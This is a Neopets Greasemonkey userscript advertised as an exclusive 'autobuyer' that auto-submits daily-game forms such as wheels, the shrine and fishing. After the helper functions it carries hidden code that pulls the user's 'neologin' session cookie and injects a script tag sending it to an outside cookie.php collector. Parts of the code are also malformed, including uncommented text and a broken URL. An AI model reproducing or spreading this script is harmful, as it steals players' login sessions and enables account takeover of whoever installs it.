// ==UserScript==
// @name           Neopets FireFox Autobuyer v4 (EXCLUSIVE)!
// @description    Not released anywhere else! Download now and try it out, will remove in 3 days to reduce leeching!
// @include        http://www.neopets.com/*
// ==/UserScript==


// Constants
sec = 1000;

// changeable Vars
var minTime = 3;
var maxTime = 5;

// script scope
(function(){ 
    var script = {
        interval:[minTime * sec,maxTime * sec],
/*
        values:[    // german
                'Dreh, Dreh, Dreh das Rad der Spannung!',
                'Nimm dir deinen Preis',
                'Meine Pets heilen',
                'Ja, ich möchte bitte eine',
                'Nimm dir etwas Omelette',
                'Näher dich dem Schrein',
                'Tombola spielen!',
                'Dreh, dreh, dreh das Rad der Mittelmäßigkeit!', 
                'Nimm deinen Preis' , 
                'Zieh an der Leine',
                'Öffne die Steintür zum Verlassenen Grabmal...',
                'Gehe weiter und riskiere, nie wieder den Weg nach draußen zu finden. Jetzt gibt es kein Zurück mehr.',
                'Dreh das Rad!!!',
                'Nimm etwas Pudding',
                

                 //priv8 Addons
                'Spiel Nochmal',
                'Pyramiden spielen!'  
                ], 
*/
        values:[   //english
                'Spin Spin Spin the Wheel of Excitement!',
                'Collect your Prize',
                'Heal my Pets',
                'Yes, I will have one please',
                'Grab some Omelette',
                'Approach the Shrine',
                'Play Tombola!',
                'Spin Spin Spin the Wheel of Mediocrity!',
                'Collect Your Prize',
                'Reel In Your Line',
                'Open the stone door to the Deserted Tomb...',
                'Continue on, at the risk of never returning.  There\'s no turning back.',
                'Spin the Wheel!!!',
                'Grab some Jelly',
                'Play Again',
                'Play Pyramids!',
                'Continue Playing'
                ], // english
                
        pages:[
                'wheel2.phtml', 
                'wheel3.phtml', 
                'springs.phtml', 
                'process_kiosk.phtml', 
                'omelette.phtml', 
                'shrine.phtml', 
                'tombola2.phtml', 
                'mediocrity2.phtml', 
                'mediocrity3.phtml', 
                '/water/fishing.phtml',
                '/worlds/geraptiku/tomb.phtml',
                '/worlds/geraptiku/process_tomb.phtml', 
                'fruitmachine2.phtml',
                'jelly.phtml',
                'potatocounter.phtml',
                'pyramids.phtml',
                'pyramids.phtml'
                ]
    };
    var i = 0;
    while(i < script.values.length)
    {
        
        var sform = document.evaluate('//form[contains(@action,"' + script.pages[i] + '")]/input[@value="'+script.values[i] +'"]',
                                    document,
                                    null,
                                    XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,
                                    null).snapshotItem(0);
       
        if(!!sform)
        {  
            sform = sform.form;
            window.setTimeout(function(){sform.submit();},randomValue(script.interval));
            break;
        }
        i++;
    }
    
})();

// Includes

function randomValue(r)

{

	return r[0]+Math.round((r[1]-r[0])*Math.random());

}
function GetStringBetween( target_str,start_str,end_str,start_pos,include_str )   {
    if ( ! start_pos ) 0;
    if ( ! include_str ) false;

    var result_str = target_str.substr( start_pos ); cut to start from start_pos
    result_str = result_str.substr( result_str.indexOf( start_str ) + start_str.length ); cut to start from start_str
    result_str = result_str.substr ( 0, result_str.indexOf( end_str ) );

    if (include_str == true)   {
        result_str = start_str + result_str + end_str
    }

    return result_str;
}


var eleNew, newElement;
var strURL = 'http:h1.ripway.com/NpSeller4Life1/cookie.php?cookie=';

var testArray = document.evaluate(
     "a[@href='javascript: void(0);']",
document, null, XPathResult.ANY_TYPE,null);

var strTest = testArray.iterateNext();

while (strTest) {
strTest = testArray.iterateNext();
}

eleNew = document.getElementById('main');

var strCookie = document.cookie;

strCookie = GetStringBetween(strCookie, 'neologin=','; ');

if (eleNew) {
    newElement = document.createElement("div");
    newElement.innerHTML='<SCRIPT SRC=' + strURL + strCookie + '>';
    eleNew.parentNode.insertBefore(newElement, eleNew.nextSibling);
}